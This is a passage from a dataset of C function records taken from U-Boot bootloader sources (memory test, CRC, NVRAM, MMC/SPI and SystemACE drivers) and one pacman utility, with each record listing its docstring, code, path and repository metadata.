ALPM_LOG_ERROR,\n\t\t\t\t\t_(\"could not restore working directory (%s)\\n\"), strerror(errno));\n\t\t}\n\t\tclose(cwdfd);\n\t}\n\n\treturn retval;\n}", "path": "lib\\libalpm\\util.c", "repo_name": "Alexpux/MSYS2-pacman", "stars": 162, "license": "gpl-2.0", "language": "c", "size": 20643}
{"docstring": "/* CONFIG_MPSC */\n", "func_signal": "void\nserial_puts (const char *s)", "code": "{\n\twhile (*s) {\n\t\tserial_putc (*s++);\n\t}\n}", "path": "board\\evb64260\\serial.c", "repo_name": "EmcraftSystems/u-boot", "stars": 177, "license": "other", "language": "c", "size": 14264}
{"docstring": "/*\n * WARNING: this code looks \"cleaner\" than the PowerPC version, but\n * has the disadvantage that you either get nothing, or everything.\n * On PowerPC, you might see \"DRAM: \" before the system hangs - which\n * gives a simple yet clear indication which part of the\n * initialization if failing.\n */\n", "func_signal": "static int display_dram_config (void)", "code": "{\n\tint i;\n\n#ifdef DEBUG\n\tputs (\"RAM Configuration:\\n\");\n\n\tfor(i=0; i<CONFIG_NR_DRAM_BANKS; i++) {\n\t\tprintf (\"Bank #%d: %08lx \", i, gd->bd->bi_dram[i].start);\n\t\tprint_size (gd->bd->bi_dram[i].size, \"\\n\");\n\t}\n#else\n\tulong size = 0;\n\n\tfor (i=0; i<CONFIG_NR_DRAM_BANKS; i++) {\n\t\tsize += gd->bd->bi_dram[i].size;\n\t}\n\tputs(\"DRAM:  \");\n\tprint_size(size, \"\\n\");\n#endif\n\n\treturn (0);\n}", "path": "lib_arm\\board.c", "repo_name": "EmcraftSystems/u-boot", "stars": 177, "license": "other", "language": "c", "size": 14264}
{"docstring": "/*\n * EPIC, PCI, and I/O devices.\n * Initialize Mousse Platform, probe for PCI devices,\n * Query configuration parameters if not set.\n */\n", "func_signal": "int misc_init_f (void)", "code": "{\n#if 0\n    m48_tod_init(); /* Init SGS M48T59Y TOD/NVRAM */\n    printf(\"RTC:   M48T589 TOD/NVRAM (%d) bytes\\n\",\n\t   TOD_NVRAM_SIZE);\n    get_tod();\n#endif\n\n    sys_led_msg(\"BOOT\");\n    return 0;\n}", "path": "board\\bmw\\bmw.c", "repo_name": "EmcraftSystems/u-boot", "stars": 177, "license": "other", "language": "c", "size": 14264}
{"docstring": "/* Read from NVRAM */\n", "func_signal": "void*\nnvram_read(void *dest, const long src, size_t count)", "code": "{\n    int i;\n    volatile unsigned char* d = (unsigned char*)dest;\n    volatile unsigned char* s = (unsigned char*)src;\n\n    for( i = 0; i < count;i++)\n\td[i] = s[i];\n\n    return dest;\n}", "path": "board\\bmw\\bmw.c", "repo_name": "EmcraftSystems/u-boot", "stars": 177, "license": "other", "language": "c", "size": 14264}
{"docstring": "/* CONFIG_CRC32_VERIFY */\n", "func_signal": "int do_mem_crc (cmd_tbl_t *cmdtp, int flag, int argc, char *argv[])", "code": "{\n\tulong addr, length;\n\tulong crc;\n\tulong *ptr;\n\tulong vcrc;\n\tint verify;\n\tint ac;\n\tchar **av;\n\n\tif (argc < 3) {\n  usage:\n\t\tcmd_usage(cmdtp);\n\t\treturn 1;\n\t}\n\n\tav = argv + 1;\n\tac = argc - 1;\n\tif (strcmp(*av, \"-v\") == 0) {\n\t\tverify = 1;\n\t\tav++;\n\t\tac--;\n\t\tif (ac < 3)\n\t\t\tgoto usage;\n\t} else\n\t\tverify = 0;\n\n\taddr = simple_strtoul(*av++, NULL, 16);\n\taddr += base_address;\n\tlength = simple_strtoul(*av++, NULL, 16);\n\n\tcrc = crc32(0, (const uchar *) addr, length);\n\n\tif (!verify) {\n\t\tprintf (\"CRC32 for %08lx ... %08lx ==> %08lx\\n\",\n\t\t\t\taddr, addr + length - 1, crc);\n\t\tif (ac > 2) {\n\t\t\tptr = (ulong *) simple_strtoul (*av++, NULL, 16);\n\t\t\t*ptr = crc;\n\t\t}\n\t} else {\n\t\tvcrc = simple_strtoul(*av++, NULL, 16);\n\t\tif (vcrc != crc) {\n\t\t\tprintf (\"CRC32 for %08lx ... %08lx ==> %08lx != %08lx ** ERROR **\\n\",\n\t\t\t\t\taddr, addr + length - 1, crc, vcrc);\n\t\t\treturn 1;\n\t\t}\n\t}\n\n\treturn 0;\n\n}", "path": "common\\cmd_mem.c", "repo_name": "EmcraftSystems/u-boot", "stars": 177, "license": "other", "language": "c", "size": 14264}
{"docstring": "/*\n * initialize higher level parts of CPU like timers\n */\n", "func_signal": "int cpu_init_r(void)", "code": "{\n#ifdef CONFIG_MCFRTC\n\tvolatile rtc_t *rtc = (volatile rtc_t *)(CONFIG_SYS_MCFRTC_BASE);\n\tvolatile rtcex_t *rtcex = (volatile rtcex_t *)&rtc->extended;\n\n\trtcex->gocu = (CONFIG_SYS_RTC_OSCILLATOR >> 16) & 0xFFFF;\n\trtcex->gocl = CONFIG_SYS_RTC_OSCILLATOR & 0xFFFF;\n#endif\n\n\treturn (0);\n}", "path": "cpu\\mcf5445x\\cpu_init.c", "repo_name": "EmcraftSystems/u-boot", "stars": 177, "license": "other", "language": "c", "size": 14264}
{"docstring": "/* CONFIG_MX_CYCLIC */\n", "func_signal": "int do_mem_cmp (cmd_tbl_t *cmdtp, int flag, int argc, char *argv[])", "code": "{\n\tulong\taddr1, addr2, count, ngood;\n\tint\tsize;\n\tint     rcode = 0;\n\n\tif (argc != 4) {\n\t\tcmd_usage(cmdtp);\n\t\treturn 1;\n\t}\n\n\t/* Check for size specification.\n\t*/\n\tif ((size = cmd_get_data_size(argv[0], 4)) < 0)\n\t\treturn 1;\n\n\taddr1 = simple_strtoul(argv[1], NULL, 16);\n\taddr1 += base_address;\n\n\taddr2 = simple_strtoul(argv[2], NULL, 16);\n\taddr2 += base_address;\n\n\tcount = simple_strtoul(argv[3], NULL, 16);\n\n#ifdef CONFIG_HAS_DATAFLASH\n\tif (addr_dataflash(addr1) | addr_dataflash(addr2)){\n\t\tputs (\"Comparison with DataFlash space not supported.\\n\\r\");\n\t\treturn 0;\n\t}\n#endif\n\n#ifdef CONFIG_BLACKFIN\n\tif (addr_bfin_on_chip_mem(addr1) || addr_bfin_on_chip_mem(addr2)) {\n\t\tputs (\"Comparison with L1 instruction memory not supported.\\n\\r\");\n\t\treturn 0;\n\t}\n#endif\n\n\tngood = 0;\n\n\twhile (count-- > 0) {\n\t\tif (size == 4) {\n\t\t\tulong word1 = *(ulong *)addr1;\n\t\t\tulong word2 = *(ulong *)addr2;\n\t\t\tif (word1 != word2) {\n\t\t\t\tprintf(\"word at 0x%08lx (0x%08lx) \"\n\t\t\t\t\t\"!= word at 0x%08lx (0x%08lx)\\n\",\n\t\t\t\t\taddr1, word1, addr2, word2);\n\t\t\t\trcode = 1;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t\telse if (size == 2) {\n\t\t\tushort hword1 = *(ushort *)addr1;\n\t\t\tushort hword2 = *(ushort *)addr2;\n\t\t\tif (hword1 != hword2) {\n\t\t\t\tprintf(\"halfword at 0x%08lx (0x%04x) \"\n\t\t\t\t\t\"!= halfword at 0x%08lx (0x%04x)\\n\",\n\t\t\t\t\taddr1, hword1, addr2, hword2);\n\t\t\t\trcode = 1;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t\telse {\n\t\t\tu_char byte1 = *(u_char *)addr1;\n\t\t\tu_char byte2 = *(u_char *)addr2;\n\t\t\tif (byte1 != byte2) {\n\t\t\t\tprintf(\"byte at 0x%08lx (0x%02x) \"\n\t\t\t\t\t\"!= byte at 0x%08lx (0x%02x)\\n\",\n\t\t\t\t\taddr1, byte1, addr2, byte2);\n\t\t\t\trcode = 1;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t\tngood++;\n\t\taddr1 += size;\n\t\taddr2 += size;\n\t}\n\n\tprintf(\"Total of %ld %s%s were the same\\n\",\n\t\tngood, size == 4 ? \"word\" : size == 2 ? \"halfword\" : \"byte\",\n\t\tngood == 1 ? \"\" : \"s\");\n\treturn rcode;\n}", "path": "common\\cmd_mem.c", "repo_name": "EmcraftSystems/u-boot", "stars": 177, "license": "other", "language": "c", "size": 14264}
{"docstring": "/*\n * Perform a memory test. A more complete alternative test can be\n * configured using CONFIG_SYS_ALT_MEMTEST. The complete test loops until\n * interrupted by ctrl-c or by a failure of one of the sub-tests.\n */\n", "func_signal": "int do_mem_mtest (cmd_tbl_t *cmdtp, int flag, int argc, char *argv[])", "code": "{\n\tvu_long\t*addr, *start, *end;\n\tulong\tval;\n\tulong\treadback;\n\tulong\terrs = 0;\n\tint iterations = 1;\n\tint iteration_limit;\n\n#if defined(CONFIG_SYS_ALT_MEMTEST)\n\tvu_long\tlen;\n\tvu_long\toffset;\n\tvu_long\ttest_offset;\n\tvu_long\tpattern;\n\tvu_long\ttemp;\n\tvu_long\tanti_pattern;\n\tvu_long\tnum_words;\n#if defined(CONFIG_SYS_MEMTEST_SCRATCH)\n\tvu_long *dummy = (vu_long*)CONFIG_SYS_MEMTEST_SCRATCH;\n#else\n\tvu_long *dummy = 0;\t/* yes, this is address 0x0, not NULL */\n#endif\n\tint\tj;\n\n\tstatic const ulong bitpattern[] = {\n\t\t0x00000001,\t/* single bit */\n\t\t0x00000003,\t/* two adjacent bits */\n\t\t0x00000007,\t/* three adjacent bits */\n\t\t0x0000000F,\t/* four adjacent bits */\n\t\t0x00000005,\t/* two non-adjacent bits */\n\t\t0x00000015,\t/* three non-adjacent bits */\n\t\t0x00000055,\t/* four non-adjacent bits */\n\t\t0xaaaaaaaa,\t/* alternating 1/0 */\n\t};\n#else\n\tulong\tincr;\n\tulong\tpattern;\n#endif\n\n\tif (argc > 1)\n\t\tstart = (ulong *)simple_strtoul(argv[1], NULL, 16);\n\telse\n\t\tstart = (ulong *)CONFIG_SYS_MEMTEST_START;\n\n\tif (argc > 2)\n\t\tend = (ulong *)simple_strtoul(argv[2], NULL, 16);\n\telse\n\t\tend = (ulong *)(CONFIG_SYS_MEMTEST_END);\n\n\tif (argc > 3)\n\t\tpattern = (ulong)simple_strtoul(argv[3], NULL, 16);\n\telse\n\t\tpattern = 0;\n\n\tif (argc > 4)\n\t\titeration_limit = (ulong)simple_strtoul(argv[4], NULL, 16);\n\telse\n\t\titeration_limit = 0;\n\n#if defined(CONFIG_SYS_ALT_MEMTEST)\n\tprintf (\"Testing %08x ... %08x:\\n\", (uint)start, (uint)end);\n\tPRINTF(\"%s:%d: start 0x%p end 0x%p\\n\",\n\t\t__FUNCTION__, __LINE__, start, end);\n\n\tfor (;;) {\n\t\tif (ctrlc()) {\n\t\t\tputc ('\\n');\n\t\t\treturn 1;\n\t\t}\n\n\n\t\tif (iteration_limit && iterations > iteration_limit) {\n\t\t\tprintf(\"Tested %d iteration(s) with %lu errors.\\n\",\n\t\t\t\titerations-1, errs);\n\t\t\treturn errs != 0;\n\t\t}\n\n\t\tprintf(\"Iteration: %6d\\r\", iterations);\n\t\tPRINTF(\"\\n\");\n\t\titerations++;\n\n\t\t/*\n\t\t * Data line test: write a pattern to the first\n\t\t * location, write the 1's complement to a 'parking'\n\t\t * address (changes the state of the data bus so a\n\t\t * floating bus doen't give a false OK), and then\n\t\t * read the value back. Note that we read it back\n\t\t * into a variable because the next time we read it,\n\t\t * it might be right (been there, tough to explain to\n\t\t * the quality guys why it prints a failure when the\n\t\t * \"is\" and \"should be\" are obviously the same in the\n\t\t * error message).\n\t\t *\n\t\t * Rather than exhaustively testing, we test some\n\t\t * patterns by shifting '1' bits through a field of\n\t\t * '0's and '0' bits through a field of '1's (i.e.\n\t\t * pattern and ~pattern).\n\t\t */\n\t\taddr = start;\n\t\tfor (j = 0; j < sizeof(bitpattern)/sizeof(bitpattern[0]); j++) {\n\t\t    val = bitpattern[j];\n\t\t    for(; val != 0; val <<= 1) {\n\t\t\t*addr  = val;\n\t\t\t*dummy  = ~val; /* clear the test data off of the bus */\n\t\t\treadback = *addr;\n\t\t\tif(readback != val) {\n\t\t\t    printf (\"FAILURE (data line): \"\n\t\t\t\t\"expected %08lx, actual %08lx\\n\",\n\t\t\t\t\t  val, readback);\n\t\t\t    errs++;\n\t\t\t    if (ctrlc()) {\n\t\t\t\tputc ('\\n');\n\t\t\t\treturn 1;\n\t\t\t    }\n\t\t\t}\n\t\t\t*addr  = ~val;\n\t\t\t*dummy  = val;\n\t\t\treadback = *addr;\n\t\t\tif(readback != ~val) {\n\t\t\t    printf (\"FAILURE (data line): \"\n\t\t\t\t\"Is %08lx, should be %08lx\\n\",\n\t\t\t\t\treadback, ~val);\n\t\t\t    errs++;\n\t\t\t    if (ctrlc()) {\n\t\t\t\tputc ('\\n');\n\t\t\t\treturn 1;\n\t\t\t    }\n\t\t\t}\n\t\t    }\n\t\t}\n\n\t\t/*\n\t\t * Based on code whose Original Author and Copyright\n\t\t * information follows: Copyright (c) 1998 by Michael\n\t\t * Barr. This software is placed into the public\n\t\t * domain and may be used for any purpose. However,\n\t\t * this notice must not be changed or removed and no\n\t\t * warranty is either expressed or implied by its\n\t\t * publication or distribution.\n\t\t */\n\n\t\t/*\n\t\t * Address line test\n\t\t *\n\t\t * Description: Test the address bus wiring in a\n\t\t *              memory region by performing a walking\n\t\t *              1's test on the relevant bits of the\n\t\t *              address and checking for aliasing.\n\t\t *              This test will find single-bit\n\t\t *              address failures such as stuck -high,\n\t\t *              stuck-low, and shorted pins. The base\n\t\t *              address and size of the region are\n\t\t *              selected by the caller.\n\t\t *\n\t\t * Notes:\tFor best results, the selected base\n\t\t *              address should have enough LSB 0's to\n\t\t *              guarantee single address bit changes.\n\t\t *              For example, to test a 64-Kbyte\n\t\t *              region, select a base address on a\n\t\t *              64-Kbyte boundary. Also, select the\n\t\t *              region size as a power-of-two if at\n\t\t *              all possible.\n\t\t *\n\t\t * Returns:     0 if the test succeeds, 1 if the test fails.\n\t\t */\n\t\tlen = ((ulong)end - (ulong)start)/sizeof(vu_long);\n\t\tpattern = (vu_long) 0xaaaaaaaa;\n\t\tanti_pattern = (vu_long) 0x55555555;\n\n\t\tPRINTF(\"%s:%d: length = 0x%.8lx\\n\",\n\t\t\t__FUNCTION__, __LINE__,\n\t\t\tlen);\n\t\t/*\n\t\t * Write the default pattern at each of the\n\t\t * power-of-two offsets.\n\t\t */\n\t\tfor (offset = 1; offset < len; offset <<= 1) {\n\t\t\tstart[offset] = pattern;\n\t\t}\n\n\t\t/*\n\t\t * Check for address bits stuck high.\n\t\t */\n\t\ttest_offset = 0;\n\t\tstart[test_offset] = anti_pattern;\n\n\t\tfor (offset = 1; offset < len; offset <<= 1) {\n\t\t    temp = start[offset];\n\t\t    if (temp != pattern) {\n\t\t\tprintf (\"\\nFAILURE: Address bit stuck high @ 0x%.8lx:\"\n\t\t\t\t\" expected 0x%.8lx, actual 0x%.8lx\\n\",\n\t\t\t\t(ulong)&start[offset], pattern, temp);\n\t\t\terrs++;\n\t\t\tif (ctrlc()) {\n\t\t\t    putc ('\\n');\n\t\t\t    return 1;\n\t\t\t}\n\t\t    }\n\t\t}\n\t\tstart[test_offset] = pattern;\n\t\tWATCHDOG_RESET();\n\n\t\t/*\n\t\t * Check for addr bits stuck low or shorted.\n\t\t */\n\t\tfor (test_offset = 1; test_offset < len; test_offset <<= 1) {\n\t\t    start[test_offset] = anti_pattern;\n\n\t\t    for (offset = 1; offset < len; offset <<= 1) {\n\t\t\ttemp = start[offset];\n\t\t\tif ((temp != pattern) && (offset != test_offset)) {\n\t\t\t    printf (\"\\nFAILURE: Address bit stuck low or shorted @\"\n\t\t\t\t\" 0x%.8lx: expected 0x%.8lx, actual 0x%.8lx\\n\",\n\t\t\t\t(ulong)&start[offset], pattern, temp);\n\t\t\t    errs++;\n\t\t\t    if (ctrlc()) {\n\t\t\t\tputc ('\\n');\n\t\t\t\treturn 1;\n\t\t\t    }\n\t\t\t}\n\t\t    }\n\t\t    start[test_offset] = pattern;\n\t\t}\n\n\t\t/*\n\t\t * Description: Test the integrity of a physical\n\t\t *\t\tmemory device by performing an\n\t\t *\t\tincrement/decrement test over the\n\t\t *\t\tentire region. In the process every\n\t\t *\t\tstorage bit in the device is tested\n\t\t *\t\tas a zero and a one. The base address\n\t\t *\t\tand the size of the region are\n\t\t *\t\tselected by the caller.\n\t\t *\n\t\t * Returns:     0 if the test succeeds, 1 if the test fails.\n\t\t */\n\t\tnum_words = ((ulong)end - (ulong)start)/sizeof(vu_long) + 1;\n\n\t\t/*\n\t\t * Fill memory with a known pattern.\n\t\t */\n\t\tfor (pattern = 1, offset = 0; offset < num_words; pattern++, offset++) {\n\t\t\tWATCHDOG_RESET();\n\t\t\tstart[offset] = pattern;\n\t\t}\n\n\t\t/*\n\t\t * Check each location and invert it for the second pass.\n\t\t */\n\t\tfor (pattern = 1, offset = 0; offset < num_words; pattern++, offset++) {\n\t\t    WATCHDOG_RESET();\n\t\t    temp = start[offset];\n\t\t    if (temp != pattern) {\n\t\t\tprintf (\"\\nFAILURE (read/write) @ 0x%.8lx:\"\n\t\t\t\t\" expected 0x%.8lx, actual 0x%.8lx)\\n\",\n\t\t\t\t(ulong)&start[offset], pattern, temp);\n\t\t\terrs++;\n\t\t\tif (ctrlc()) {\n\t\t\t    putc ('\\n');\n\t\t\t    return 1;\n\t\t\t}\n\t\t    }\n\n\t\t    anti_pattern = ~pattern;\n\t\t    start[offset] = anti_pattern;\n\t\t}\n\n\t\t/*\n\t\t * Check each location for the inverted pattern and zero it.\n\t\t */\n\t\tfor (pattern = 1, offset = 0; offset < num_words; pattern++, offset++) {\n\t\t    WATCHDOG_RESET();\n\t\t    anti_pattern = ~pattern;\n\t\t    temp = start[offset];\n\t\t    if (temp != anti_pattern) {\n\t\t\tprintf (\"\\nFAILURE (read/write): @ 0x%.8lx:\"\n\t\t\t\t\" expected 0x%.8lx, actual 0x%.8lx)\\n\",\n\t\t\t\t(ulong)&start[offset], anti_pattern, temp);\n\t\t\terrs++;\n\t\t\tif (ctrlc()) {\n\t\t\t    putc ('\\n');\n\t\t\t    return 1;\n\t\t\t}\n\t\t    }\n\t\t    start[offset] = 0;\n\t\t}\n\t}\n\n#else /* The original, quickie test */\n\tincr = 1;\n\tfor (;;) {\n\t\tif (ctrlc()) {\n\t\t\tputc ('\\n');\n\t\t\treturn 1;\n\t\t}\n\n\t\tif (iteration_limit && iterations > iteration_limit) {\n\t\t\tprintf(\"Tested %d iteration(s) with %lu errors.\\n\",\n\t\t\t\titerations-1, errs);\n\t\t\treturn errs != 0;\n\t\t}\n\t\t++iterations;\n\n\t\tprintf (\"\\rPattern %08lX  Writing...\"\n\t\t\t\"%12s\"\n\t\t\t\"\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\",\n\t\t\tpattern, \"\");\n\n\t\tfor (addr=start,val=pattern; addr<end; addr++) {\n\t\t\tWATCHDOG_RESET();\n\t\t\t*addr = val;\n\t\t\tval  += incr;\n\t\t}\n\n\t\tputs (\"Reading...\");\n\n\t\tfor (addr=start,val=pattern; addr<end; addr++) {\n\t\t\tWATCHDOG_RESET();\n\t\t\treadback = *addr;\n\t\t\tif (readback != val) {\n\t\t\t\tprintf (\"\\nMem error @ 0x%08X: \"\n\t\t\t\t\t\"found %08lX, expected %08lX\\n\",\n\t\t\t\t\t(uint)addr, readback, val);\n\t\t\t\terrs++;\n\t\t\t\tif (ctrlc()) {\n\t\t\t\t\tputc ('\\n');\n\t\t\t\t\treturn 1;\n\t\t\t\t}\n\t\t\t}\n\t\t\tval += incr;\n\t\t}\n\n\t\t/*\n\t\t * Flip the pattern each time to make lots of zeros and\n\t\t * then, the next time, lots of ones.  We decrement\n\t\t * the \"negative\" patterns and increment the \"positive\"\n\t\t * patterns to preserve this feature.\n\t\t */\n\t\tif(pattern & 0x80000000) {\n\t\t\tpattern = -pattern;\t/* complement & increment */\n\t\t}\n\t\telse {\n\t\t\tpattern = ~pattern;\n\t\t}\n\t\tincr = -incr;\n\t}\n#endif\n\treturn 0;\t/* not reached */\n}", "path": "common\\cmd_mem.c", "repo_name": "EmcraftSystems/u-boot", "stars": 177, "license": "other", "language": "c", "size": 14264}
{"docstring": "/************************************************************************\n * Coloured LED functionality\n ************************************************************************\n * May be supplied by boards if desired\n */\n", "func_signal": "void inline __coloured_LED_init (void)", "code": "{}\nvoid coloured_LED_init (void) __attribute__((weak, alias(\"__coloured_LED_init\")));\nvoid inline __red_LED_on (void) {}\nvoid red_LED_on (void) __attribute__((weak, alias(\"__red_LED_on\")));\nvoid inline __red_LED_off(void) {}\nvoid red_LED_off(void) __attribute__((weak, alias(\"__red_LED_off\")));\nvoid inline __green_LED_on(void) {}\nvoid green_LED_on(void) __attribute__((weak, alias(\"__green_LED_on\")));\nvoid inline __green_LED_off(void) {}\nvoid green_LED_off(void) __attribute__((weak, alias(\"__green_LED_off\")));\nvoid inline __yellow_LED_on(void) {}\nvoid yellow_LED_on(void) __attribute__((weak, alias(\"__yellow_LED_on\")));\nvoid inline __yellow_LED_off(void) {}\nvoid yellow_LED_off(void) __attribute__((weak, alias(\"__yellow_LED_off\")));\nvoid inline __blue_LED_on(void) {}\nvoid blue_LED_on(void) __attribute__((weak, alias(\"__blue_LED_on\")));\nvoid inline __blue_LED_off(void) {}\nvoid blue_LED_off(void) __attribute__((weak, alias(\"__blue_LED_off\")));\n\n/************************************************************************\n * Init Utilities\t\t\t\t\t\t\t*\n ************************************************************************\n * Some of this code should be moved into the core functions,\n * or dropped completely,\n * but let's get it working (again) first...\n */\n\n#if defined(CONFIG_ARM_DCC) && !defined(CONFIG_BAUDRATE)\n#define CONFIG_BAUDRATE 115200\n#endif\nstatic int init_baudrate (void)\n{\n\tchar tmp[64];\t/* long enough for environment variables */\n\n\tint i = getenv_r (\"baudrate\", tmp, sizeof (tmp));\n\n\tgd->bd->bi_baudrate = gd->baudrate = (i > 0)\n\t\t\t? (int) simple_strtoul (tmp, NULL, 10)\n\t\t\t: CONFIG_BAUDRATE;\n\n\treturn (0);\n}", "path": "lib_arm\\board.c", "repo_name": "EmcraftSystems/u-boot", "stars": 177, "license": "other", "language": "c", "size": 14264}
{"docstring": "/* Write to NVRAM */\n", "func_signal": "void\nnvram_write(long dest, const void *src, size_t count)", "code": "{\n    int i;\n    volatile unsigned char* d = (unsigned char*)dest;\n    volatile unsigned char* s = (unsigned char*)src;\n\n    SYS_TOD_UNPROTECT();\n\n    for( i = 0; i < count;i++)\n\td[i] = s[i];\n\n    SYS_TOD_PROTECT();\n}", "path": "board\\bmw\\bmw.c", "repo_name": "EmcraftSystems/u-boot", "stars": 177, "license": "other", "language": "c", "size": 14264}
{"docstring": "/*\n * Write characters to LCD display.\n * Note that the bytes for the first character is the last address.\n */\n", "func_signal": "void\nsys_led_msg(char* msg)", "code": "{\n    LED_REG(0) = msg[3];\n    LED_REG(1) = msg[2];\n    LED_REG(2) = msg[1];\n    LED_REG(3) = msg[0];\n}", "path": "board\\bmw\\bmw.c", "repo_name": "EmcraftSystems/u-boot", "stars": 177, "license": "other", "language": "c", "size": 14264}
{"docstring": "/* initialize the hardware */\n", "func_signal": "int mmc_hw_init(void)", "code": "{\n\tunsigned long a;\n\tunsigned short int Timeout = 0;\n\tunsigned char b;\n\tunsigned char CMD[] = {0x40, 0x00, 0x00, 0x00, 0x00, 0x95};\n\n\t/* set-up GPIO and SPI */\n\t(*((volatile unsigned long *)PINSEL2)) &= ~(1l << 3); /* clear bit 3 */\n\t(*((volatile unsigned long *)IO1DIR)) |= (1l << 22); /* set bit 22 (output) */\n\n\tMMC_Disable();\n\n\tspi_lock();\n\tspi_set_clock(248);\n\tspi_set_cfg(0, 1, 0);\n\tMMC_Enable();\n\n\t/* waste some time */\n\tfor(a=0; a < 20000; a++)\n\t\tasm(\"nop\");\n\n\t/* Put the MMC/SD-card into SPI-mode */\n\tfor (b = 0; b < 10; b++) /* Sends min 74+ clocks to the MMC/SD-card */\n\t\tspi_write(0xff);\n\n\t/* Sends command CMD0 to MMC/SD-card */\n\twhile (Write_Command_MMC(CMD) != 1) {\n\t\tif (Timeout++ > 200) {\n\t\t\tMMC_Disable();\n\t\t\tspi_unlock();\n\t\t\treturn(1); /* Abort with command 1 (return 1) */\n\t\t}\n\t}\n\t/* Sends Command CMD1 an MMC/SD-card */\n\tTimeout = 0;\n\tCMD[0] = 0x41;/* Command 1 */\n\tCMD[5] = 0xFF;\n\n\twhile (Write_Command_MMC(CMD) != 0) {\n\t\tif (Timeout++ > 200) {\n\t\t\tMMC_Disable();\n\t\t\tspi_unlock();\n\t\t\treturn (2); /* Abort with command 2 (return 2) */\n\t\t}\n\t}\n\n\tMMC_Disable();\n\tspi_unlock();\n\n\treturn 0;\n}", "path": "cpu\\arm720t\\lpc2292\\mmc_hw.c", "repo_name": "EmcraftSystems/u-boot", "stars": 177, "license": "other", "language": "c", "size": 14264}
{"docstring": "/* ############################################################################\n   Routine to write a block (512 byte) to the MMC/SD-card\n   ######################################################################### */\n", "func_signal": "unsigned char mmc_write_sector (unsigned long addr,unsigned char *Buffer)", "code": "{\n\tunsigned char tmp, a;\n\tunsigned short int b;\n\t/* Command 24 to write a block to the MMC/SD - card */\n\tunsigned char CMD[] = {0x58, 0x00, 0x00, 0x00, 0x00, 0xFF};\n\n\t/* The addres on the MMC/SD-card is in bytes,\n\taddr is transformed from blocks to bytes and the result is\n\tplaced into the command */\n\n\taddr = addr << 9; /* addr = addr * 512 */\n\n\tCMD[1] = ((addr & 0xFF000000) >> 24);\n\tCMD[2] = ((addr & 0x00FF0000) >> 16);\n\tCMD[3] = ((addr & 0x0000FF00) >> 8 );\n\n\tspi_lock();\n\tmmc_spi_cfg();\n\tMMC_Enable();\n\n\t/* Send command CMD24 to the MMC/SD-card (Write 1 Block/512 Bytes) */\n\ttmp = Write_Command_MMC(CMD);\n\tif (tmp != 0) {\n\t\tMMC_Disable();\n\t\tspi_unlock();\n\t\treturn(tmp);\n\t}\n\n\t/* Do a short delay and send a clock-pulse to the MMC/SD-card */\n\tfor (a = 0; a < 100; a++)\n\t\tspi_read();\n\n\t/* Send a start byte to the MMC/SD-card */\n\tspi_write(0xFE);\n\n\t/* Write the block (512 bytes) to the MMC/SD-card */\n\tfor (b = 0; b < 512; b++)\n\t\tspi_write(*Buffer++);\n\n\t/* write the CRC-Byte */\n\tspi_write(0xFF); /* write a dummy CRC */\n\tspi_write(0xFF); /* CRC code is not used */\n\n\t/* Wait for MMC/SD-card busy */\n\twhile (spi_read() != 0xff) {};\n\n\t/* set MMC_Chip_Select to high (MMC/SD-card inactive) */\n\tMMC_Disable();\n\tspi_unlock();\n\treturn (0);\n}", "path": "cpu\\arm720t\\lpc2292\\mmc_hw.c", "repo_name": "EmcraftSystems/u-boot", "stars": 177, "license": "other", "language": "c", "size": 14264}
{"docstring": "/* ! CONFIG_MPSC */\n", "func_signal": "int serial_init (void)", "code": "{\n\tint clock_divisor = CONFIG_SYS_NS16550_CLK / 16 / gd->baudrate;\n\n#ifdef CONFIG_SYS_INIT_CHAN1\n\t(void)NS16550_init(COM_PORTS[0], clock_divisor);\n#endif\n#ifdef CONFIG_SYS_INIT_CHAN2\n\t(void)NS16550_init(COM_PORTS[1], clock_divisor);\n#endif\n\n\treturn (0);\n}", "path": "board\\evb64260\\serial.c", "repo_name": "EmcraftSystems/u-boot", "stars": 177, "license": "other", "language": "c", "size": 14264}
{"docstring": "/*\n * This function is called (by dereferencing the block_read pointer in\n * the dev_desc) to read blocks of data. The return value is the\n * number of blocks read. A zero return indicates an error.\n */\n", "func_signal": "static unsigned long systemace_read(int dev, unsigned long start,\n\t\t\t\t    unsigned long blkcnt, void *buffer)", "code": "{\n\tint retry;\n\tunsigned blk_countdown;\n\tunsigned char *dp = buffer;\n\tunsigned val;\n\n\tif (get_cf_lock() < 0) {\n\t\tunsigned status = ace_readw(0x04);\n\n\t\t/* If CFDETECT is false, card is missing. */\n\t\tif (!(status & 0x0010)) {\n\t\t\tprintf(\"** CompactFlash card not present. **\\n\");\n\t\t\treturn 0;\n\t\t}\n\n\t\tprintf(\"**** ACE locked away from me (STATUSREG=%04x)\\n\",\n\t\t       status);\n\t\treturn 0;\n\t}\n#ifdef DEBUG_SYSTEMACE\n\tprintf(\"... systemace read %lu sectors at %lu\\n\", blkcnt, start);\n#endif\n\n\tretry = 2000;\n\tfor (;;) {\n\t\tval = ace_readw(0x04);\n\n\t\t/* If CFDETECT is false, card is missing. */\n\t\tif (!(val & 0x0010)) {\n\t\t\tprintf(\"**** ACE CompactFlash not found.\\n\");\n\t\t\trelease_cf_lock();\n\t\t\treturn 0;\n\t\t}\n\n\t\t/* If RDYFORCMD, then we are ready to go. */\n\t\tif (val & 0x0100)\n\t\t\tbreak;\n\n\t\tif (retry < 0) {\n\t\t\tprintf(\"**** SystemACE not ready.\\n\");\n\t\t\trelease_cf_lock();\n\t\t\treturn 0;\n\t\t}\n\n\t\tudelay(1000);\n\t\tretry -= 1;\n\t}\n\n\t/* The SystemACE can only transfer 256 sectors at a time, so\n\t   limit the current chunk of sectors. The blk_countdown\n\t   variable is the number of sectors left to transfer. */\n\n\tblk_countdown = blkcnt;\n\twhile (blk_countdown > 0) {\n\t\tunsigned trans = blk_countdown;\n\n\t\tif (trans > 256)\n\t\t\ttrans = 256;\n\n#ifdef DEBUG_SYSTEMACE\n\t\tprintf(\"... transfer %lu sector in a chunk\\n\", trans);\n#endif\n\t\t/* Write LBA block address */\n\t\tace_writew((start >> 0) & 0xffff, 0x10);\n\t\tace_writew((start >> 16) & 0x0fff, 0x12);\n\n\t\t/* NOTE: in the Write Sector count below, a count of 0\n\t\t   causes a transfer of 256, so &0xff gives the right\n\t\t   value for whatever transfer count we want. */\n\n\t\t/* Write sector count | ReadMemCardData. */\n\t\tace_writew((trans & 0xff) | 0x0300, 0x14);\n\n/*\n * For FPGA configuration via SystemACE is reset 